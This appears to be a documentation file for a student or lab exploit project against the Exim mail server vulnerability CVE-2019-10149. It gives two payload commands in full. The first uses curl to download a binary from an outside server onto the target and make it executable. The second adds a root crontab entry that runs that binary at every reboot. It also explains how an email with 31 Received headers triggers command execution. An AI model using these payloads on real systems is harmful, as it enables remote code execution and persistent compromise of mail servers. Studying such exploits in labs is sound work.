# Payload files documentation

curl_call_to_place_file.py uses a payload derived from the command `"/bin/sh -c 'su - exploit -c \"curl -k -o /var/tmp/utility https://192.168.0.77:8080/utility\"; chmod +x /var/tmp/utility'"`. This command makes a curl call to our server, pulls the utility file off as our exploit user on the VM, and sets it to be executable. 

crontab-payload.py uses a payload derived from the command `"""/bin/sh -c \'(crontab -l 2>/dev/null; echo \"@reboot /var/tmp/utility\") | crontab -\'\""""`. We got this command from https://stackoverflow.com/questions/4880290/how-do-i-create-a-crontab-through-a-script. 
This updates the crontab for root on the target VM to include a job which starts /var/tmp/utility when the machine is rebooted.

In general, our two python files, adapted from https://github.com/Diefunction/CVE-2019-10149/blob/master/exploit.py with our custom payloads do the following:

Craft an email with all the standard commands needed for communication over SMTP. In the final crafted email, there are 31 received headers, one more than Exim's usually alotted 30, allowing us to enter the vulnerable part of the code which reads the command from the recipiant's name. 